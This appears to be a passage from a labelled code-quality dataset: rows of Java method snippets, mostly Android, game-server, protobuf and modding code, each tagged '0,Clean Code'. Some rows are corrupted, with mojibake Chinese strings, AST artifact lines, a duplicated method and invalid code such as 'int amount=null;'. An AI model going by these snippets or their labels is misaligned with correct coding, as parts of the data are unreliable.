}",0,Clean Code
"@Override protected String getValueName(BlockEntityType<?> value){
  String name=""Unknown"";
  if (value == BlockEntityType.FURNACE)   name=""Furnace"";
 else   if (value == BlockEntityType.CHEST)   name=""Chest"";
 else   if (value == BlockEntityType.TRAPPED_CHEST)   name=""Trapped Chest"";
 else   if (value == BlockEntityType.ENDER_CHEST)   name=""Ender Chest"";
 else   if (value == BlockEntityType.DISPENSER)   name=""Dispenser"";
 else   if (value == BlockEntityType.DROPPER)   name=""Dropper"";
 else   if (value == BlockEntityType.HOPPER)   name=""Hopper"";
 else   if (value == BlockEntityType.SHULKER_BOX)   name=""Shulker Box"";
 else   if (value == BlockEntityType.BARREL)   name=""Barrel"";
 else   if (value == BlockEntityType.SMOKER)   name=""Smoker"";
 else   if (value == BlockEntityType.BLAST_FURNACE)   name=""Blast Furnace"";
  return name;
}
",0,Clean Code
"@Override public void addInterceptors(InterceptorRegistry registry){
  registry.addInterceptor(userTypeInterceptor()).addPathPatterns(""/**"").excludePathPatterns(""/blog/**"",""/editor/**"",""/error"");
}
",0,Clean Code
"public static String computeCompanyAge(Integer companyAge){
  if (companyAge <= 0) {
    return """";
  }
  int year=companyAge / 365;
  int month=(companyAge % 365) / 30;
  int day=(companyAge % 365) % 30;
  StringBuilder sb=new StringBuilder();
  if (year != 0) {
    sb.append(year).append(""骞�"");
  }
  if (month != 0) {
    sb.append(month).append(""鏈�"");
  }
  if (day != 0) {
    sb.append(day).append(""澶�"");
  }
  return sb.toString();
}",0,Clean Code
"@Override public String toString(){
  return ""MetaStringBytes{"" + ""hashCode="" + hashCode + "", size=""+ bytes.length+ "", bytes=""+ Arrays.toString(bytes)+ '}';
}
",0,Clean Code
"/** 
 * @param method the method to set
 */
public void setMethod(String method){
  this.method=method;
}
",0,Clean Code
"/** 
 * <code>optional string text = 15;</code>
 * @return the text
 */
public String getText(){
  return text.getString();
}",0,Clean Code
"@Override public String toString(){
  return ""DeleteRecruitChannelBO{"" + ""deleteChannelId="" + deleteChannelId + "", changeChannelId=""+ changeChannelId+ '}';
}
",0,Clean Code
"/** 
 * 鎵归噺鍒犻櫎鏂囦欢
 * @param keys key鍒楄〃
 */
public void deleteFileBatch(List<String> keys);
/** 
 * 鎵归噺鍒犻櫎鏂囦欢
 * @param keys       key鍒楄〃
 * @param bucketName 妗跺悕绉�
 */
public void deleteFileBatch(List<String> keys,String bucketName);
",0,Clean Code
"public EVisibilityFilter getVisibilityFilter(){
  if (visibilityCombo.getValue().equals(FILTER_ITEM_VISIBLE)) {
    return EVisibilityFilter.VISIBLE;
  }
 else   if (visibilityCombo.getValue().equals(FILTER_ITEM_INVISIBLE)) {
    return EVisibilityFilter.INVISIBLE;
  }
  return EVisibilityFilter.NONE;
}
",0,Clean Code
"@Test @DisplayName(""it should honor the polling interval from annotations and config"") void threadCountTest() throws NoSuchMethodException {
  var config=new TestWorkerConfig();
  var worker=new MultipleInputParams();
  var worker2=new AnotherAnnotationInput();
  AnnotatedWorkerExecutor annotatedWorkerExecutor=new AnnotatedWorkerExecutor(mock(TaskClient.class),config);
  annotatedWorkerExecutor.addBean(worker);
  annotatedWorkerExecutor.addBean(worker2);
  annotatedWorkerExecutor.startPolling();
  TaskRunnerConfigurer runner=annotatedWorkerExecutor.getTaskRunner();
  assertNotNull(runner);
  Map<String,Integer> taskThreadCount=runner.getTaskThreadCount();
  assertNotNull(taskThreadCount);
  assertEquals(3,taskThreadCount.get(""test_1""));
  assertEquals(1,taskThreadCount.get(""test_2""));
  annotatedWorkerExecutor.shutdown();
  config.setThreadCount(""test_2"",2);
  annotatedWorkerExecutor=new AnnotatedWorkerExecutor(mock(TaskClient.class),config);
  annotatedWorkerExecutor.addBean(worker);
  annotatedWorkerExecutor.addBean(worker2);
  annotatedWorkerExecutor.startPolling();
  runner=annotatedWorkerExecutor.getTaskRunner();
  taskThreadCount=runner.getTaskThreadCount();
  assertNotNull(taskThreadCount);
  assertEquals(3,taskThreadCount.get(""test_1""));
  assertEquals(2,taskThreadCount.get(""test_2""));
}",0,Clean Code
"@Override public boolean equals(Object obj){
  if (this == obj)   return true;
  if (obj == null)   return false;
  if (getClass() != obj.getClass())   return false;
  VertexAiGeminiChatOptions other=(VertexAiGeminiChatOptions)obj;
  if (stopSequences == null) {
    if (other.stopSequences != null)     return false;
  }
 else   if (!stopSequences.equals(other.stopSequences))   return false;
  if (temperature == null) {
    if (other.temperature != null)     return false;
  }
 else   if (!temperature.equals(other.temperature))   return false;
  if (topP == null) {
    if (other.topP != null)     return false;
  }
 else   if (!topP.equals(other.topP))   return false;
  if (topK == null) {
    if (other.topK != null)     return false;
  }
 else   if (!topK.equals(other.topK))   return false;
  if (candidateCount == null) {
    if (other.candidateCount != null)     return false;
  }
 else   if (!candidateCount.equals(other.candidateCount))   return false;
  if (maxOutputTokens == null) {
    if (other.maxOutputTokens != null)     return false;
  }
 else   if (!maxOutputTokens.equals(other.maxOutputTokens))   return false;
  if (model == null) {
    if (other.model != null)     return false;
  }
 else   if (!model.equals(other.model))   return false;
  if (functionCallbacks == null) {
    if (other.functionCallbacks != null)     return false;
  }
 else   if (!functionCallbacks.equals(other.functionCallbacks))   return false;
  if (functions == null) {
    if (other.functions != null)     return false;
  }
 else   if (!functions.equals(other.functions))   return false;
  return true;
}
",0,Clean Code
"public static void normalizeFlags(TLRPC.Message message){
  if (message.from_id == null) {
    message.flags&=~256;
  }
  if (message.from_id == null) {
    message.flags&=~4;
  }
  if (message.reply_to == null) {
    message.flags&=~8;
  }
  if (message.media == null) {
    message.flags&=~512;
  }
  if (message.reply_markup == null) {
    message.flags&=~64;
  }
  if (message.replies == null) {
    message.flags&=~8388608;
  }
  if (message.reactions == null) {
    message.flags&=~1048576;
  }
}",0,Clean Code
"/** 
 * @param mouseButton one of the MOUSE_* constants of this class.
 */
public void sendMouseEvent(int mouseButton,int column,int row,boolean pressed){
  if (column < 1)   column=1;
  if (column > mColumns)   column=mColumns;
  if (row < 1)   row=1;
  if (row > mRows)   row=mRows;
  if (mouseButton == MOUSE_LEFT_BUTTON_MOVED && !isDecsetInternalBitSet(DECSET_BIT_MOUSE_TRACKING_BUTTON_EVENT)) {
  }
 else   if (isDecsetInternalBitSet(DECSET_BIT_MOUSE_PROTOCOL_SGR)) {
    mSession.write(String.format(""\033[<%d;%d;%d"" + (pressed ? 'M' : 'm'),mouseButton,column,row));
  }
 else {
    mouseButton=pressed ? mouseButton : 3;
    boolean out_of_bounds=column > 255 - 32 || row > 255 - 32;
    if (!out_of_bounds) {
      byte[] data={'\033','[','M',(byte)(32 + mouseButton),(byte)(32 + column),(byte)(32 + row)};
      mSession.write(data,0,data.length);
    }
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 MMFONFFPNJM = 8;</code>
 * @return this
 */
public RogueMiracleDataInfo clearMMFONFFPNJM(){
  bitField0_&=~0x00000002;
  mMFONFFPNJM=0;
  return this;
}",0,Clean Code
"public String getXmlContent(){
  return this.xmlContent;
}
",0,Clean Code
"@Override public void onTearDown(){
  if (isTornDown()) {
    return;
  }
  if (mPlaceholderListener != null) {
    mPlaceholderListener.invalidate();
  }
  if (mMainListener != null) {
    mMainListener.invalidate();
  }
  super.onTearDown();
  if (mNativeQuad != null) {
    mNativeQuad.dispose();
    mNativeQuad=null;
  }
  if (mDefaultMaterial != null) {
    mDefaultMaterial.dispose();
    mDefaultMaterial=null;
  }
  if (mLatestImage != null) {
    mLatestImage.destroy();
    mLatestImage=null;
  }
  if (mLatestImageTexture != null) {
    mLatestImageTexture.dispose();
    mLatestImageTexture=null;
  }
}
",0,Clean Code
"public static void extractRootfs(Context context,boolean romExist,boolean needsUpgrade,boolean forceInstall,boolean use3rdRom){
  removeSystemPartition(context);
  removeVendorPartition(context);
  if (!romExist) {
    extractRootfsInAssets(context);
    return;
  }
  if (forceInstall) {
    if (use3rdRom) {
      boolean success=extract3rdRootfs(context);
      if (!success) {
        showRootfsInstallationFailure(context);
        return;
      }
    }
 else {
      if (!extractRootfsInAssets(context)) {
        showRootfsInstallationFailure(context);
        return;
      }
    }
    AppKV.setBooleanConfig(context,AppKV.FORCE_ROM_BE_RE_INSTALL,false);
  }
 else {
    if (use3rdRom) {
      Log.w(TAG,""WTF? 3rd ROM must be force install!"");
    }
    if (needsUpgrade) {
      Log.i(TAG,""upgrade factory rom.."");
      if (!extractRootfsInAssets(context)) {
        showRootfsInstallationFailure(context);
      }
    }
  }
}
public static int extractRootfs(Context context,File rootfs7z){
  int cpu=Runtime.getRuntime().availableProcessors();
  return P7ZipApi.executeCommand(String.format(Locale.US,""7z x -mmt=%d -aoa '%s' '-o%s'"",cpu,rootfs7z,context.getDataDir()));
}",0,Clean Code
"public Float getRepetitionPenalty(){
  return repetitionPenalty;
}
",0,Clean Code
"public String getEventName(){
  return bundle.getString(""EVENT_NAME"");
}
!org.eclipse.jdt.core.dom.MethodDeclaration@4ec7bd88",0,Clean Code
"void changedY(CBend bend,double y);
",0,Clean Code
"private static void home(){
  String s=AntStallRpcCall.home();
  try {
    JSONObject jo=new JSONObject(s);
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      if (!jo.getBoolean(""hasRegister"") || jo.getBoolean(""hasQuit"")) {
        Log.farm(""铓傝殎鏂版潙鉀鍏堝紑鍚殏铓佹柊鏉�"");
        return;
      }
      JSONObject astReceivableCoinVO=jo.getJSONObject(""astReceivableCoinVO"");
      if (astReceivableCoinVO.optBoolean(""hasCoin"")) {
        settleReceivable();
      }
      if (Config.stallThrowManure()) {
        throwManure();
      }
      JSONObject seatsMap=jo.getJSONObject(""seatsMap"");
      settle(seatsMap);
      collectManure();
      sendBack(seatsMap);
      if (Config.stallAutoClose()) {
        closeShop();
      }
      if (Config.stallAutoOpen()) {
        openShop();
      }
      taskList();
      achieveBeShareP2P();
      if (Config.stallDonate()) {
        roadmap();
      }
    }
 else {
      Log.recordLog(""home err:"",s);
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""home err:"");
    Log.printStackTrace(TAG,t);
  }
}",0,Clean Code
"/** 
 * Returns an array of the property names on the given script object.
 */
private Object[] getObjectIdsImpl(Context cx,Object object){
  if (!(object instanceof Scriptable) || object == Undefined.instance) {
    return Context.emptyArgs;
  }
  Object[] ids;
  Scriptable scriptable=(Scriptable)object;
  if (scriptable instanceof DebuggableObject) {
    ids=((DebuggableObject)scriptable).getAllIds();
  }
 else {
    ids=scriptable.getIds();
  }
  Scriptable proto=scriptable.getPrototype();
  Scriptable parent=scriptable.getParentScope();
  int extra=0;
  if (proto != null) {
    ++extra;
  }
  if (parent != null) {
    ++extra;
  }
  if (extra != 0) {
    Object[] tmp=new Object[extra + ids.length];
    System.arraycopy(ids,0,tmp,extra,ids.length);
    ids=tmp;
    extra=0;
    if (proto != null) {
      ids[extra++]=""__proto__"";
    }
    if (parent != null) {
      ids[extra++]=""__parent__"";
    }
  }
  return ids;
}",0,Clean Code
"@Override public void removedBend(final CViewEdge<?> edge,final int index,final CBend bend){
  bend.removeListener(m_listener);
  if (m_realizer.bendCount() == m_rawEdge.getBendCount()) {
    return;
  }
  m_realizer.removeBend(m_realizer.getBend(index));
}
@Override public void removedBend(final ZyEdgeRealizer<EdgeTypeT> realizer,final int position){
  m_rawEdge.removeBend(position);
}
",0,Clean Code
"private KNNModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private KNNModelProto(){
  vectors_=java.util.Collections.emptyList();
  outputs_=java.util.Collections.emptyList();
  parallelBackend_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@496819a6",0,Clean Code
"public void roll(ItemParamMap drops){
  if (this.chance < 1000) {
    int random=Utils.randomRange(0,999);
    if (random > this.chance) {
      return;
    }
  }
  var count=BigDecimal.valueOf(generateCount());
  var rates=LunarCore.getConfig().getServerRates();
  while (count.doubleValue() > 0) {
    int itemId=generateItemId();
    ItemExcel excel=GameData.getItemExcelMap().get(itemId);
    if (excel == null)     break;
    if (excel.isEquippable()) {
      if (rates.getEquip() > 0) {
        drops.addTo(itemId,1);
        count=count.subtract(BigDecimal.valueOf(1.0 / rates.getEquip()));
      }
 else {
        count=count.subtract(BigDecimal.ONE);
      }
    }
 else {
      int amount=null;
      if (amount > 0) {
        drops.addTo(itemId,amount);
      }
      count=BigDecimal.ZERO;
    }
  }
}",0,Clean Code
"@Override public SetFriendMarkScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  uid=0;
  retcode=0;
  isSetMark=false;
  return this;
}",0,Clean Code
"@TruffleBoundary private UnmodifiableEconomicSet<Object> collectAllRegularPropertyNames(){
  if (EconomicMaps.isEmpty(declaredProperties)) {
    return superclass == null ? EconomicSet.create() : superclass.getAllRegularPropertyNames();
  }
  var size=superclass == null ? 0 : superclass.getAllRegularPropertyNames().size();
  var result=EconomicSet.create(size);
  for (  var property : EconomicMaps.getValues(declaredProperties)) {
    if (!(property.isLocal() || isHiddenProperty(property.getName()) || property.isExternal())) {
      result.add(property.getName());
    }
  }
  if (superclass == null) {
    return result;
  }
  if (result.isEmpty()) {
    return superclass.getAllRegularPropertyNames();
  }
  result.addAll(superclass.getAllRegularPropertyNames());
  return result;
}",0,Clean Code
"/** 
 * Returns the set of permissions corresponding to a given  {@code String}representation. <p> The  {@code perms} parameter is a {@code String} representing thepermissions. It has 9 characters that are interpreted as three sets of three. The first set refers to the owner's permissions; the next to the group permissions and the last to others. Within each set, the first character is  {@code 'r'} to indicate permission to read, the secondcharacter is  {@code 'w'} to indicate permission to write, and the thirdcharacter is  {@code 'x'} for execute permission. Where a permission isnot set then the corresponding character is set to  {@code '-'}. <p> <b>Usage Example:</b> Suppose we require the set of permissions that indicate the owner has read, write, and execute permissions, the group has read and execute permissions and others have none. <pre> Set&lt;FilePermission&gt; perms = FilePermissions.fromString(""rwxr-x---""); </pre>
 * @param perms string representing a set of permissions
 * @return  the resulting set of permissions
 * @throws IllegalArgumentException if the string cannot be converted to a set of permissions
 * @see #toString(Set)
 */
public static Set<FilePermission> fromString(String perms){
  if (perms.length() != 9)   throw new IllegalArgumentException(""Invalid mode"");
  Set<FilePermission> result=EnumSet.noneOf(FilePermission.class);
  if (isR(perms.charAt(0)))   result.add(OWNER_READ);
  if (isW(perms.charAt(1)))   result.add(OWNER_WRITE);
  if (isX(perms.charAt(2)))   result.add(OWNER_EXECUTE);
  if (isR(perms.charAt(3)))   result.add(GROUP_READ);
  if (isW(perms.charAt(4)))   result.add(GROUP_WRITE);
  if (isX(perms.charAt(5)))   result.add(GROUP_EXECUTE);
  if (isR(perms.charAt(6)))   result.add(OTHERS_READ);
  if (isW(perms.charAt(7)))   result.add(OTHERS_WRITE);
  if (isX(perms.charAt(8)))   result.add(OTHERS_EXECUTE);
  return result;
}",0,Clean Code
"/** 
 * <code>optional uint32 relic_unique_id = 10;</code>
 * @return the relicUniqueId
 */
public int getRelicUniqueId(){
  return relicUniqueId;
}",0,Clean Code
"private List<? extends KeyReference> createKey(Object[] keys){
  boolean[] reclaimedFlags=new boolean[keys.length];
  if (GraalvmSupport.isGraalBuildtime()) {
    List<NoCallbackRef> keyRefs=new ArrayList<>();
    for (    Object key : keys) {
      keyRefs.add(new NoCallbackRef(key));
    }
    return keyRefs;
  }
  List<FinalizableKeyReference> keyRefs=new ArrayList<>();
  for (int i=0; i < keys.length; i++) {
    keyRefs.add(new FinalizableKeyReference(keys[i],keyRefs,reclaimedFlags,i));
  }
  return keyRefs;
}",0,Clean Code
"@Override public void mouseReleased(final MouseEvent event){
  if (event.isPopupTrigger()) {
    showPopupMenu(event);
  }
}
",0,Clean Code
"private EvaluatorBuilder(){
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)24);
    output.writeUInt32NoTag(equipmentUniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)32);
    output.writeUInt32NoTag(baseAvatarId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)80);
    output.writeUInt32NoTag(equipAvatarId);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.equipmentUniqueId,equipmentUniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeUInt32(FieldNames.baseAvatarId,baseAvatarId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeUInt32(FieldNames.equipAvatarId,equipAvatarId);
  }
  output.endObject();
}",0,Clean Code
"public ZhipuChatHeaderAuthorizationInterceptor(String key,String secret){
  this.key=key;
  this.secret=secret;
}
",0,Clean Code
"@Override public void handleLoadPackage(){
  initHook(UseThirdPartyBrowser.INSTANCE,mPrefsMap.getBoolean(""content_extension_browser""));
  initHook(new DisableChatWatermark(),mPrefsMap.getBoolean(""voiceassist_disable_watermark""));
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code GetGachaInfoScRsp}
 */
public static GetGachaInfoScRsp newInstance(){
  return new GetGachaInfoScRsp();
}
",0,Clean Code
"private void openItem(CacheModel.FileInfo fileInfo,CacheCell cacheCell){
  RecyclerListView recyclerListView=(RecyclerListView)viewPagerFixed.getCurrentView();
  if (cacheCell.type == TYPE_DOCUMENTS) {
    if (!(recyclerListView.getAdapter() instanceof DocumentsAdapter)) {
      return;
    }
    DocumentsAdapter documentsAdapter=(DocumentsAdapter)recyclerListView.getAdapter();
    PhotoViewer.getInstance().setParentActivity(parentFragment);
    if (placeProvider == null) {
      placeProvider=new BasePlaceProvider();
    }
    placeProvider.setRecyclerListView(recyclerListView);
    if (fileIsMedia(fileInfo.file)) {
      ArrayList<Object> photoEntries=new ArrayList<>();
      photoEntries.add(new MediaController.PhotoEntry(0,0,0,fileInfo.file.getPath(),0,fileInfo.type == TYPE_VIDEOS,0,0,0));
      ;
      PhotoViewer.getInstance().openPhotoForSelect(photoEntries,0,PhotoViewer.SELECT_TYPE_NO_SELECT,false,placeProvider,null);
    }
 else {
      AndroidUtilities.openForView(fileInfo.file,fileInfo.file.getName(),null,parentFragment.getParentActivity(),null);
    }
  }
  if (cacheCell.type == TYPE_MUSIC) {
    if (MediaController.getInstance().isPlayingMessage(fileInfo.messageObject)) {
      if (!MediaController.getInstance().isMessagePaused()) {
        MediaController.getInstance().pauseMessage(fileInfo.messageObject);
      }
 else {
        MediaController.getInstance().playMessage(fileInfo.messageObject);
      }
    }
 else {
      MediaController.getInstance().playMessage(fileInfo.messageObject);
    }
  }
  return;
}",0,Clean Code
"@Override public boolean onCustomLayout(View view,int left,int top,int right,int bottom){
  int width=(right - left);
  int height=(bottom - top);
  boolean isPortrait=width < height;
  if (view == cameraPanel) {
    if (isPortrait) {
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        cameraPanel.layout(0,bottom - AndroidUtilities.dp(126 + 96),width,bottom - AndroidUtilities.dp(96));
      }
 else {
        cameraPanel.layout(0,bottom - AndroidUtilities.dp(126),width,bottom);
      }
    }
 else {
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        cameraPanel.layout(right - AndroidUtilities.dp(126 + 96),0,right - AndroidUtilities.dp(96),height);
      }
 else {
        cameraPanel.layout(right - AndroidUtilities.dp(126),0,right,height);
      }
    }
    return true;
  }
 else   if (view == zoomControlView) {
    if (isPortrait) {
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        zoomControlView.layout(0,bottom - AndroidUtilities.dp(126 + 96 + 38+ 50),width,bottom - AndroidUtilities.dp(126 + 96 + 38));
      }
 else {
        zoomControlView.layout(0,bottom - AndroidUtilities.dp(126 + 50),width,bottom - AndroidUtilities.dp(126));
      }
    }
 else {
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        zoomControlView.layout(right - AndroidUtilities.dp(126 + 96 + 38+ 50),0,right - AndroidUtilities.dp(126 + 96 + 38),height);
      }
 else {
        zoomControlView.layout(right - AndroidUtilities.dp(126 + 50),0,right - AndroidUtilities.dp(126),height);
      }
    }
    return true;
  }
 else   if (view == counterTextView) {
    int cx;
    int cy;
    if (isPortrait) {
      cx=(width - counterTextView.getMeasuredWidth()) / 2;
      cy=bottom - AndroidUtilities.dp(113 + 16 + 38);
      counterTextView.setRotation(0);
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        cy-=AndroidUtilities.dp(96);
      }
    }
 else {
      cx=right - AndroidUtilities.dp(113 + 16 + 38);
      cy=height / 2 + counterTextView.getMeasuredWidth() / 2;
      counterTextView.setRotation(-90);
      if (cameraPhotoRecyclerView.getVisibility() == View.VISIBLE) {
        cx-=AndroidUtilities.dp(96);
      }
    }
    counterTextView.layout(cx,cy,cx + counterTextView.getMeasuredWidth(),cy + counterTextView.getMeasuredHeight());
    return true;
  }
 else   if (view == cameraPhotoRecyclerView) {
    if (isPortrait) {
      int cy=height - AndroidUtilities.dp(88);
      view.layout(0,cy,view.getMeasuredWidth(),cy + view.getMeasuredHeight());
    }
 else {
      int cx=left + width - AndroidUtilities.dp(88);
      view.layout(cx,0,cx + view.getMeasuredWidth(),view.getMeasuredHeight());
    }
    return true;
  }
  return false;
}",0,Clean Code
"@Override public void doubleClicked(){
}
",0,Clean Code
"@NonNull public static String describeIntent(@NonNull Intent intent,String prefix){
  String action=intent.getAction();
  String data=intent.getDataString();
  String type=intent.getType();
  Set<String> categories=intent.getCategories();
  ComponentName cn=intent.getComponent();
  String packageName=intent.getPackage();
  int flags=intent.getFlags();
  Bundle extras=intent.getExtras();
  StringBuilder sb=new StringBuilder();
  if (action != null)   sb.append(prefix).append("" ACTION\t"").append(action).append(""\n"");
  if (data != null)   sb.append(prefix).append("" DATA\t"").append(data).append(""\n"");
  if (type != null)   sb.append(prefix).append("" TYPE\t"").append(type).append(""\n"");
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
    String id=intent.getIdentifier();
    if (id != null)     sb.append(prefix).append("" IDENTIFIER\t"").append(id).append(""\n"");
  }
  if (categories != null) {
    for (    String category : categories) {
      sb.append(prefix).append("" CATEGORY\t"").append(category).append(""\n"");
    }
  }
  if (cn != null)   sb.append(prefix).append("" COMPONENT\t"").append(cn.flattenToString()).append(""\n"");
  if (packageName != null)   sb.append(prefix).append("" PACKAGE\t"").append(packageName).append(""\n"");
  if (flags != 0)   sb.append(prefix).append("" FLAGS\t0x"").append(Integer.toHexString(flags)).append(""\n"");
  if (extras != null) {
    for (    String key : extras.keySet()) {
      Pair<Integer,String> typeAndString=valueToParsableStringAndType(extras.get(key));
      if (typeAndString != null) {
        sb.append(prefix).append("" EXTRA\t"").append(key).append(""\t"").append(typeAndString.first);
        if (typeAndString.first != TYPE_NULL) {
          sb.append(""\t"").append(typeAndString.second);
        }
        sb.append(""\n"");
      }
    }
  }
  return sb.toString();
}",0,Clean Code
"/** 
 * <code>optional uint32 cur_chat_bubble = 10;</code>
 * @return this
 */
public SelectChatBubbleScRsp clearCurChatBubble(){
  bitField0_&=~0x00000002;
  curChatBubble=0;
  return this;
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.test.protos.MockMultiOutputInfoProto)) {
    return super.equals(obj);
  }
  org.tribuo.test.protos.MockMultiOutputInfoProto other=(org.tribuo.test.protos.MockMultiOutputInfoProto)obj;
  if (!getLabelList().equals(other.getLabelList()))   return false;
  if (!getCountsList().equals(other.getCountsList()))   return false;
  if (!getIdList().equals(other.getIdList()))   return false;
  if (getUnknownCount() != other.getUnknownCount())   return false;
  if (getLabelCounter() != other.getLabelCounter())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"public Builder withPrompt(String prompt){
  this.prompt=prompt;
  return this;
}
public Builder withPrompt(String prompt){
  this.prompt=prompt;
  return this;
}
",0,Clean Code
"void initializedComment(IFunction function,List<CommentType> comment);
",0,Clean Code
"private static String getAppPath(){
  try {
    String jarPath=System.getProperty(""project.path"");
    return FileUtil.getParent(jarPath,4);
  }
 catch (  Exception e) {
    log.error(""getAppPath error"",e);
    return null;
  }
}",0,Clean Code
"void accept(int node,float score);
",0,Clean Code
"@Override public Color getBorderColor(){
  return new Color(m_borderColor.getRGB());
}
",0,Clean Code
"@Override public Optional<Resource> getResource(ResourceLocation id){
  final String path=id.getPath();
  if (path.endsWith(""json"")) {
    return Optional.of(new StringResource(id,json));
  }
 else   if (path.endsWith(""vsh"")) {
    return Optional.of(new StringResource(id,vertex));
  }
 else   if (path.endsWith(""gsh"")) {
    if (geometry == null) {
      return Optional.empty();
    }
    return Optional.of(new StringResource(id,geometry));
  }
 else   if (path.endsWith(""tcs"")) {
    if (tessControl == null) {
      return Optional.empty();
    }
    return Optional.of(new StringResource(id,tessControl));
  }
 else   if (path.endsWith(""tes"")) {
    if (tessEval == null) {
      return Optional.empty();
    }
    return Optional.of(new StringResource(id,tessEval));
  }
 else   if (path.endsWith(""fsh"")) {
    return Optional.of(new StringResource(id,fragment));
  }
  return Optional.empty();
}
",0,Clean Code
"private CRFParametersProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private CRFParametersProto(){
}
!org.eclipse.jdt.core.dom.MethodDeclaration@4b0cc719",0,Clean Code
"public void onDetachedFromWindow(){
  if (!attachedToWindow) {
    return;
  }
  attachedToWindow=false;
  if (currentImageLocation != null || currentMediaLocation != null || currentThumbLocation != null || staticThumbDrawable != null) {
    if (setImageBackup == null) {
      setImageBackup=new SetImageBackup();
    }
    setImageBackup.mediaLocation=currentMediaLocation;
    setImageBackup.mediaFilter=currentMediaFilter;
    setImageBackup.imageLocation=currentImageLocation;
    setImageBackup.imageFilter=currentImageFilter;
    setImageBackup.thumbLocation=currentThumbLocation;
    setImageBackup.thumbFilter=currentThumbFilter;
    setImageBackup.thumb=staticThumbDrawable;
    setImageBackup.size=currentSize;
    setImageBackup.ext=currentExt;
    setImageBackup.cacheType=currentCacheType;
    setImageBackup.parentObject=currentParentObject;
  }
  if (!ignoreNotifications) {
    NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.didReplacedPhotoInMemCache);
    NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.stopAllHeavyOperations);
    NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.startAllHeavyOperations);
  }
  if (staticThumbDrawable instanceof AttachableDrawable) {
    ((AttachableDrawable)staticThumbDrawable).onDetachedFromWindow(this);
  }
  if (staticThumbDrawable != null) {
    setStaticDrawable(null);
    thumbShader=null;
    roundPaint.setShader(null);
  }
  clearImage();
  if (isPressed == 0) {
    pressedProgress=0f;
  }
  AnimatedFileDrawable animatedFileDrawable=getAnimation();
  if (animatedFileDrawable != null) {
    animatedFileDrawable.removeParent(this);
  }
  RLottieDrawable lottieDrawable=getLottieAnimation();
  if (lottieDrawable != null) {
    lottieDrawable.removeParentView(this);
  }
}",0,Clean Code
"private static BiomeCategories getBiomeCategory(Holder<Biome> holder){
  if (holder.is(BiomeTags.WITHOUT_WANDERING_TRADER_SPAWNS)) {
    return BiomeCategories.NONE;
  }
 else   if (holder.is(BiomeTags.HAS_VILLAGE_SNOWY)) {
    return BiomeCategories.ICY;
  }
 else   if (holder.is(BiomeTags.IS_HILL)) {
    return BiomeCategories.EXTREME_HILLS;
  }
 else   if (holder.is(BiomeTags.IS_TAIGA)) {
    return BiomeCategories.TAIGA;
  }
 else   if (holder.is(BiomeTags.IS_OCEAN)) {
    return BiomeCategories.OCEAN;
  }
 else   if (holder.is(BiomeTags.IS_JUNGLE)) {
    return BiomeCategories.JUNGLE;
  }
 else   if (holder.is(BiomeTags.IS_FOREST)) {
    return BiomeCategories.FOREST;
  }
 else   if (holder.is(BiomeTags.IS_BADLANDS)) {
    return BiomeCategories.MESA;
  }
 else   if (holder.is(BiomeTags.IS_NETHER)) {
    return BiomeCategories.NETHER;
  }
 else   if (holder.is(BiomeTags.IS_END)) {
    return BiomeCategories.THE_END;
  }
 else   if (holder.is(BiomeTags.IS_BEACH)) {
    return BiomeCategories.BEACH;
  }
 else   if (holder.is(BiomeTags.HAS_DESERT_PYRAMID)) {
    return BiomeCategories.DESERT;
  }
 else   if (holder.is(BiomeTags.IS_RIVER)) {
    return BiomeCategories.RIVER;
  }
 else   if (holder.is(BiomeTags.HAS_CLOSER_WATER_FOG)) {
    return BiomeCategories.SWAMP;
  }
 else   if (holder.is(BiomeTags.PLAYS_UNDERWATER_MUSIC)) {
    return BiomeCategories.UNDERGROUND;
  }
 else   if (holder.is(BiomeTags.WITHOUT_ZOMBIE_SIEGES)) {
    return BiomeCategories.MUSHROOM;
  }
 else   if (holder.is(BiomeTags.IS_MOUNTAIN)) {
    return BiomeCategories.MOUNTAIN;
  }
 else {
    return BiomeCategories.PLAINS;
  }
}
",0,Clean Code
"/** 
 * <code>optional .SceneBattleInfo battle_info = 7;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableBattleInfo()} if you want to modify it.
 * @return internal storage object for reading
 */
public SceneBattleInfoOuterClass.SceneBattleInfo getBattleInfo(){
  return battleInfo;
}",0,Clean Code
"@Override public long getGuildId(){
  return 0;
}",0,Clean Code
"public Pair<RawFunction,RawFunction> getMatchedFunctionPairAt(final int index){
  return matchedFunctionPairs.get(index);
}
",0,Clean Code
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.locationPermissionGranted) {
    locationDenied=false;
    askedForLocation=false;
    positionMarker();
    if (adapter != null) {
      adapter.setMyLocationDenied(locationDenied,askedForLocation);
    }
